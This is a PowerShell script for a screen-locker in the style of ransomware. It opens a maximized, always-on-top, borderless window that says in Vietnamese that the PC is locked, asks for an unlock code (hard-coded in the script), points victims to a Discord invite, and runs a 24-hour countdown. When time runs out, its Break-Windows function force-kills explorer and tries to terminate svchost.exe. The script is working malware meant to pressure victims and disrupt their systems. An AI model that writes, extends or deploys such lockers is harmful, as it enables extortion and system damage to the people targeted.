Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ====== SETTINGS ======
$correctKey = "taodeptrai"
$hoursLeft = 24
$deadline = (Get-Date).AddHours($hoursLeft)

# ====== FORM SETUP ======
$form = New-Object Windows.Forms.Form
$form.Text = "Locked by BensGaming"
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = [Drawing.Color]::FromArgb(30, 30, 30)
$form.StartPosition = 'CenterScreen'

# ====== MAIN PANEL (ƒë·ªÉ canh gi·ªØa n·ªôi dung) ======
$panel = New-Object Windows.Forms.Panel
$panel.Size = New-Object Drawing.Size(800, 500)
$panel.BackColor = 'Transparent'
$panel.Location = New-Object Drawing.Point(($form.Width - $panel.Width)/2, ($form.Height - $panel.Height)/2)
$panel.Anchor = 'None'
$form.Controls.Add($panel)

# ====== LABEL - TITLE ======
$labelTitle = New-Object Windows.Forms.Label
$labelTitle.Text = "üõë PC B·ªä KH√ìA üõë"
$labelTitle.Font = New-Object Drawing.Font("Segoe UI", 36, [Drawing.FontStyle]::Bold)
$labelTitle.ForeColor = 'Red'
$labelTitle.AutoSize = $true
$labelTitle.Location = New-Object Drawing.Point(180, 20)
$panel.Controls.Add($labelTitle)

# ====== LABEL - INSTRUCTION ======
$labelInstruction = New-Object Windows.Forms.Label
$labelInstruction.Text = "Vui l√≤ng nh·∫≠p m√£ m·ªü kh√≥a b√™n d∆∞·ªõi`nLi√™n h·ªá Discord: https://discord.gg/rf3fcuwz"
$labelInstruction.Font = New-Object Drawing.Font("Segoe UI", 14)
$labelInstruction.ForeColor = 'White'
$labelInstruction.AutoSize = $true
$labelInstruction.Location = New-Object Drawing.Point(150, 100)
$panel.Controls.Add($labelInstruction)

# ====== LABEL - COUNTDOWN ======
$countdownLabel = New-Object Windows.Forms.Label
$countdownLabel.Font = New-Object Drawing.Font("Consolas", 24, [Drawing.FontStyle]::Bold)
$countdownLabel.ForeColor = 'Orange'
$countdownLabel.AutoSize = $true
$countdownLabel.Location = New-Object Drawing.Point(250, 180)
$panel.Controls.Add($countdownLabel)

# ====== TEXTBOX - INPUT ======
$textBox = New-Object Windows.Forms.TextBox
$textBox.Font = New-Object Drawing.Font("Consolas", 20)
$textBox.Width = 400
$textBox.Location = New-Object Drawing.Point(200, 240)
$textBox.TextAlign = 'Center'
$panel.Controls.Add($textBox)

# ====== BUTTON - UNLOCK ======
$button = New-Object Windows.Forms.Button
$button.Text = "M·ªû KH√ìA"
$button.Font = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
$button.BackColor = [Drawing.Color]::FromArgb(50, 150, 50)
$button.ForeColor = 'White'
$button.Width = 200
$button.Height = 50
$button.Location = New-Object Drawing.Point(300, 300)
$panel.Controls.Add($button)

# ====== FUNCTION: PH√Å H·ªÜ TH·ªêNG ======
function Break-Windows {
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
    Start-Sleep -s 1
    try {
        taskkill /f /im svchost.exe | Out-Null
    } catch {}
}

# ====== BUTTON CLICK EVENT ======
$button.Add_Click({
    if ($textBox.Text -eq $correctKey) {
        [Windows.Forms.MessageBox]::Show("ƒê√£ m·ªü kh√≥a", "Th√†nh c√¥ng", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
        $form.Close()
    } else {
        [Windows.Forms.MessageBox]::Show("Sai m√£!", "L·ªói", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Error)
    }
})

# ====== COUNTDOWN TIMER ======
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 1000
$timer.Add_Tick({
    $timeLeft = $deadline - (Get-Date)
    if ($timeLeft.TotalSeconds -le 0) {
        $timer.Stop()
        Break-Windows
    }
    $countdownLabel.Text = "‚è≥ C√≤n l·∫°i: " + $timeLeft.ToString("hh\:mm\:ss")
})
$timer.Start()

# ====== SHOW FORM ======
$form.Add_Shown({ $form.Activate() })
$form.ShowDialog()
